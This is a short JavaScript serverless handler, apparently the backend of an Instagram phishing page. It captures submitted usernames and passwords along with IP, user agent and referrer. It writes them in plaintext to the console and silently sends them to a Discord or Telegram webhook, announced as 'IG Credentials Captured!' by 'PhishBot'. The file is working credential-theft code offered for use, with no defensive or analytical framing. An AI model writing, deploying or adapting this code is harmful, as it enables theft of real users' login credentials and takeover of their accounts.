export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, password, ip, ua, referrer } = req.body;
    const timestamp = new Date().toISOString();
    const clientIP = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress;

    // Format log
    const log = `[${timestamp}] IP: ${clientIP} | UA: ${ua?.slice(0,50)} | USERNAME: ${username} | PASS: ${password} | REF: ${referrer || 'direct'}\n`;

    // 1. Console log (Vercel dashboard)
    console.log(log);

    // 2. Webhook (Discord/Telegram)
    if (process.env.WEBHOOK_URL) {
      await fetch(process.env.WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**🎣 IG Credentials Captured!**\n\`\`\`${log}\`\`\``,
          username: 'PhishBot'
        })
      }).catch(() => {}); // Silent fail
    }

    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Capture error:', error);
    res.status(500).json({ error: 'Internal error' });
  }
}